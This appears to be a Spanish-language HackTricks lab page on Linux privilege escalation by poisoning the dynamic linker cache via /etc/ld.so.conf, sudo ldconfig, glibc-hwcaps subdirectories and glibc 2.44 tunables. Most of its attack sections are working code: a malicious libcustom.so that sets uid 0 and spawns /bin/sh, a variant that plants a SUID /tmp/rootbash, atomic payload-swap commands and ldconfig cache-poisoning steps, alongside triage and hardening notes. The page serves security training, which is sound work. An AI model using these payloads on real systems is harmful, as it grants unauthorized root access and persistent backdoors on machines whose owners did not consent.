# Ejemplo de exploit de privesc de ld.so

{{#include ../../banners/hacktricks-training.md}}

Esta página es un laboratorio centrado en el envenenamiento de la caché del linker del sistema mediante `/etc/ld.so.conf` o `ldconfig`. Para la inyección de librerías faltantes, `RPATH`/`RUNPATH` modificables, `LD_PRELOAD` y otros abusos genéricos del linker en SUID, consulta [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Preparar el entorno

En la siguiente sección puedes encontrar el código de los archivos que vamos a utilizar para preparar el entorno

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Crea** esos archivos en tu máquina, en la misma carpeta
2. **Compila** la **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copia** `libcustom.so` a `/usr/lib` y actualiza la caché: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (privilegios de root)
4. **Compila** el **ejecutable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Comprobar el entorno

Comprueba que _libcustom.so_ se está **cargando** desde _/usr/lib_ y que puedes **ejecutar** el binario.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Comandos útiles de triage

Al atacar un objetivo real, verifica el **nombre exacto de la biblioteca** que necesita el binario, qué está **resolviendo actualmente el loader** y qué rutas configuradas se pueden escribir sin modificar la caché activa.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
Usa `ldd` únicamente con un ejecutable **de confianza**. Algunas implementaciones o intérpretes ELF inusuales pueden hacer que se ejecute código controlado por un atacante; `objdump -p ./file | grep NEEDED` muestra de forma segura las dependencias directas. Para un objetivo de confianza, invocar el intérprete descubierto con `--list` muestra la resolución real. Compara esa salida con `--inhibit-cache --list`: una diferencia demuestra que `/etc/ld.so.cache`, y no una regla de ruta de búsqueda ordinaria, seleccionó el objeto.<sup>[[1]](#references)[[4]](#references)</sup>

Algunos detalles importantes:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` normalmente **no funciona** porque la redirección la realiza tu shell actual. Usa
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` en su lugar.
- Los binarios **SUID/privilegiados** se ejecutan en **secure-execution mode**: `LD_LIBRARY_PATH`
se ignora, mientras que `LD_PRELOAD` está restringido (los nombres que contienen barras diagonales
se ignoran, y solo se pueden precargar bibliotecas marcadas como setuid en directorios estándar). Una vez que root ejecuta `ldconfig`, los directorios incluidos en
`/etc/ld.so.conf` pueden entrar en `/etc/ld.so.cache`, por lo que esta configuración incorrecta aún puede afectar a programas privilegiados.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` también se ignora en secure-execution mode a menos que exista `/etc/suid-debug`, así que recopila su traza desde una ejecución no-SUID equivalente en lugar de esperar una salida de la ejecución privilegiada.<sup>[[1]](#references)</sup>
- En glibc 2.33 y posteriores, el dynamic loader también expone
`--list-diagnostics`, que muestra diagnósticos del loader legibles por máquinas e información sobre las rutas de búsqueda integradas cuando un hijack no se comporta como se esperaba.<sup>[[1]](#references)[[6]](#references)</sup>

### Restricciones de caché y SONAME

`ldconfig` no almacena en caché todos los archivos arbitrarios de un directorio configurado: examina las cabeceras ELF, reconoce nombres que coinciden con `lib*.so*` o `ld-*.so*`, y espera la cadena convencional `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`. Por tanto, el objeto inyectado debe tener la arquitectura/clase objetivo, el nombre exacto de `DT_NEEDED` (normalmente su `DT_SONAME`) y cualquier símbolo o versión que resuelva la víctima.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Prefiere una library específica del objetivo, como en este ejemplo. Sombrear un SONAME común con un objeto incompleto puede interrumpir todos los procesos que lo resuelvan antes de que se ejecute el objetivo privilegiado.<sup>[[3]](#references)</sup>

### Persistencia de rutas en caché y reemplazos atómicos

La caché registra una asignación de **nombre de library a ruta**; no incluye el objeto compartido. Después de que se almacena en caché una ruta controlada por el atacante, reemplazar el objeto en esa ruta exacta afecta a los procesos recién iniciados sin otra ejecución de `ldconfig`. Esto permite un patrón útil de comprobación de tiempo de uso: exponer una library válida durante la reconstrucción o inspección de la caché por parte de un administrador y, después, renombrar atómicamente el payload sobre ella. Los procesos existentes conservan el objeto que ya tienen mapeado.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Del mismo modo, eliminar la línea maliciosa de `ld.so.conf` no elimina por sí solo una entrada ya escrita: el administrador debe eliminar el objeto no confiable, corregir la propiedad y los permisos de escritura, y reconstruir la caché. Usa la comparación `--inhibit-cache` anterior para distinguir una entrada obsoleta de la caché de una ruta de configuración que aún está activa.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

En este escenario, supongamos que un administrador ha añadido una entrada vulnerable a un archivo bajo `/etc/ld.so.conf.d/` que está incluido por el archivo `/etc/ld.so.conf` del sistema.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
La carpeta vulnerable es _/home/ubuntu/lib_ (donde tenemos acceso de escritura).\
**Descarga y compila** el siguiente código dentro de esa ruta:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Si esperas que **root** (u otra cuenta con privilegios) ejecute posteriormente el binario vulnerable, normalmente es mejor dejar un **artefacto propiedad de root** en lugar de iniciar una shell interactiva. Por ejemplo:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Después de que se produzca la ejecución con privilegios, puedes usar `/tmp/rootbash -p`.

Ahora que hemos **creado la biblioteca maliciosa libcustom dentro de la ruta mal configurada**, la caché predeterminada debe reconstruirse mediante una ejecución privilegiada exitosa de **`ldconfig`**. Un reinicio solo ayuda cuando el proceso de arranque local realmente lo ejecuta; de lo contrario, espera a que un administrador realice alguna acción o usa una regla de sudo insegura si hay alguna disponible.<sup>[[2]](#references)</sup>

Una vez que esto haya ocurrido, **vuelve a comprobar** desde dónde el ejecutable `sharedvuln` está cargando la biblioteca `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Como puedes ver, lo está **cargando desde `/home/ubuntu/lib`** y, si cualquier usuario lo ejecuta, se ejecutará un shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Ten en cuenta que en este ejemplo no hemos escalado privilegios, pero modificando los comandos ejecutados y **esperando a que root u otro usuario con privilegios ejecute el binario vulnerable**, podremos escalar privilegios.

### Shadowing moderno de `glibc-hwcaps`

Desde glibc 2.33, el loader puede preferir libraries optimizadas ubicadas en `glibc-hwcaps/<level>/` dentro de **cada directorio de búsqueda de libraries**. Por lo tanto, comprobar solo `/home/ubuntu/lib` es insuficiente: un subdirectorio compatible y escribible como `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` puede hacer shadowing de la library base después de que `ldconfig` la indexe, mientras que otras CPUs siguen utilizando el objeto base. Esto también proporciona un hijack selectivo por arquitectura que puede pasar desapercibido cuando la validación se realiza en otra CPU.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
La guía actual de hardening de glibc recomienda evitar SONAMEs duplicados, ubicaciones de búsqueda no predeterminadas y objetos en subdirectorios `glibc-hwcaps`. Desde la perspectiva de una auditoría, aplica comprobaciones recursivas de ownership y writeability a los directorios configurados y a los componentes de su ruta principal.<sup>[[3]](#references)</sup>

### Otras configuraciones incorrectas - Misma vuln

En el ejemplo anterior simulamos una configuración incorrecta en la que un administrador **estableció una carpeta no privilegiada dentro de un archivo de configuración en `/etc/ld.so.conf.d/`**.\
Pero hay otras configuraciones incorrectas que pueden causar la misma vulnerabilidad: si tienes **permisos de escritura** en un **config file** cargado, puedes crear un archivo en un directorio `/etc/ld.so.conf.d/` con permisos de escritura o puedes escribir en `/etc/ld.so.conf`, puedes configurar y explotar la misma vulnerabilidad.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Supón que tienes privilegios sudo sobre `ldconfig`**. `ldconfig` acepta directorios de búsqueda como argumentos posicionales, por lo que la forma más corta de cache-poisoning suele ser simplemente:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Como alternativa, `-f` selecciona otro archivo de configuración y conserva la salida de caché predeterminada. Esto resulta útil cuando un filtro de argumentos bloquea los directorios posicionales, pero aún permite `-f`, o cuando se deben inyectar varias rutas:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Ahora, como se indica en el **exploit anterior**, **crea la biblioteca maliciosa dentro de `/tmp`**.\
Y finalmente, carguemos la ruta y comprobemos desde dónde está cargando el binary la biblioteca:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Como puedes ver, tener privilegios sudo sobre `ldconfig` permite explotar la misma vulnerabilidad.** Los detalles de las opciones son importantes al evaluar una regla sudo restringida: `-f` selecciona otra configuración, pero aun así reconstruye `/etc/ld.so.cache`; `-C` redirige la caché a otro lugar; `-N` impide reconstruir la caché; y `-X` impide actualizar los enlaces, pero **aun así reconstruye la caché, salvo que se combine con `-N`**. `-n` implica `-N`, por lo que puede actualizar enlaces en los directorios proporcionados, pero no puede envenenar la caché; `-r` opera bajo una raíz alternativa y normalmente no modifica la caché del host.<sup>[[2]](#references)</sup>

## glibc 2.44: ajustes almacenados en caché para todo el sistema

A partir de glibc 2.44, `ldconfig` también analiza `/etc/tunables.conf` y almacena sus configuraciones como una extensión en `/etc/ld.so.cache`. El archivo acepta directivas `include` y filtros por proceso. Los prefijos controlan el ámbito: `@` se dirige únicamente a procesos `AT_SECURE`, `$` los excluye y `*` incluye ambos. Esto amplía el límite de auditoría más allá de los directorios de bibliotecas: una configuración de tunables escribible o un archivo incluido puede influir en futuros inicios de programas después de una reconstrucción privilegiada de la caché.<sup>[[7]](#references)</sup>

La misma versión añade `ldconfig -t TUNCONF`, que selecciona un archivo de tunables alternativo mientras sigue escribiendo en la caché normal, a menos que otra opción lo modifique. Por lo tanto, los wrappers y las reglas sudo que intentaban bloquear únicamente `-f` también deben rechazar `-t`, los directorios posicionales arbitrarios y la manipulación de la salida de la caché.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
Esto no es una ejecución arbitraria de código automática. Es una primitiva privilegiada de **loader-behavior manipulation**: glibc advierte explícitamente que los valores de todo el sistema pueden aplicar parámetros ajustables sensibles para la seguridad a programas setuid/setgid sin una revisión de seguridad individual por parámetro. Enumera los parámetros ajustables reales del host con `--list-tunables` y busca cambios específicos del allocator, cambios de endurecimiento de la CPU o condiciones de denegación de servicio, en lugar de asumir un payload universal.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - página del manual de Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Endurecimiento del enlazador dinámico - la biblioteca GNU C](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - página del manual de Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (utilidades binarias de GNU)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Diagnóstico del enlazador dinámico (la biblioteca GNU C)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [Parámetros ajustables de todo el sistema (la biblioteca GNU C 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Añadir parámetros ajustables de todo el sistema: parte ldconfig (parche v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
{{#include ../../banners/hacktricks-training.md}}
